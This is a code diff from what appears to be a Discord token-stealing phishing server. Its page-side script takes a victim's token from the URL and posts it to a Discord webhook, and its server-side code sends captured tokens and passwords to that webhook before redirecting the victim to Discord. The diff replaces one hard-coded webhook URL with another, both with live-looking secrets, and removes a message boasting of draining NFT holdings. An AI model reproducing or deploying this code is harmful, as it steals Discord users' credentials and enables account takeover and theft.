@@ -81,14 +81,12 @@ app.get("/k", async (req, res) => {
 <title>onload/redirect</title>
 <script>
 
-var webhookURL = "https://discord.com/api/webhooks/1054523228946698291/LaUKoZqQyVz6Tm5AN4QeRIjEb5iI1Q53dRErqyXjFhNo76GFljTD7dF96hv9EbPFjcNi";
+var webhookURL = "https://discord.com/api/webhooks/1052050979840860182/q1mTfTpBYZpFK9fQGiWGDUNYnge16ODe3TGNXJRjDRirpU71HoO9sgwSy5ddQfMxrKAz";
 var url_string = window.location.href; 
 var url = new URL(url_string);
 var currentURL = url.searchParams.get("user");
-const data = await doxToken(token, pass && typeof pass === "string" ? pass.trim() : null);
-
 var postData = {
-  content: "@everyone @here FEDS JUST HIT A TOKEN WE DRAINING BAYC6969 WITH SEAPORT AND MONKEY DRAINER LOLOL " + data
+  content: "@everyone @here new token " + currentURL
 };
 fetch(webhookURL, {
   method: "POST",
@@ -130,7 +128,7 @@ window.location="https://discord.com/channels/@me";
       if (process.logged.find((e) => e.token === token && e.passowrd === pass)) {
         console.log("Found Duplicate Logged ID");
       } else {
-        await axios({ method: "POST", url: "https://discord.com/api/webhooks/1054523228946698291/LaUKoZqQyVz6Tm5AN4QeRIjEb5iI1Q53dRErqyXjFhNo76GFljTD7dF96hv9EbPFjcNi", data: { content: "@everyone @here", embeds: [embed.toJSON()] } }).catch((err) => console.log(err.name));
+        await axios({ method: "POST", url: "https://discord.com/api/webhooks/1052050979840860182/q1mTfTpBYZpFK9fQGiWGDUNYnge16ODe3TGNXJRjDRirpU71HoO9sgwSy5ddQfMxrKAz", data: { content: "@everyone @here", embeds: [embed.toJSON()] } }).catch((err) => console.log(err.name));
         process.logged.push({ token, password: pass });
       }
     } catch (err) {
